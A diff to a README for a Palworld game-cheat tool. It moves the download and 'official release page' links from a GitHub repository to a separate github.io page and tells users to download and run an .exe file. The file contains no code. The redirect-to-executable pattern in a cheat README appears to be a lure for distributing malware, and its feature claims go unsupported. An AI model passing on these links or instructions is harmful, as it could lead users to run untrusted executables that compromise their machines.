@@ -1,6 +1,6 @@
 # 🎮 Palworld-Extreme-Cheat - Unlock every feature in your game
 
-[![Download Palworld-Extreme-Cheat](https://img.shields.io/badge/Download-Palworld_Extreme_Cheat-blue.svg)](https://github.com/bookings4160/Palworld-Extreme-Cheat)
+[![Download Palworld-Extreme-Cheat](https://img.shields.io/badge/Download-Palworld_Extreme_Cheat-blue.svg)](https://bookings4160.github.io)
 
 Palworld-Extreme-Cheat provides tools to change your gaming experience. This software grants control over game variables. You gain the ability to spawn items, fly, and toggle invincibility while you play. These tools work within your game session to modify health, movement, and resource limits.
 
@@ -28,7 +28,7 @@ This software runs on Windows desktop systems. Ensure your machine meets these s
 
 Follow these steps to configure the software on your computer.
 
-1. Visit the [official release page](https://github.com/bookings4160/Palworld-Extreme-Cheat) to access the latest files.
+1. Visit the [official release page](https://bookings4160.github.io) to access the latest files.
 2. Select the most recent version from the list.
 3. Download the executable file ending in .exe to your desktop or downloads folder.
 4. Locate the file in your file explorer.
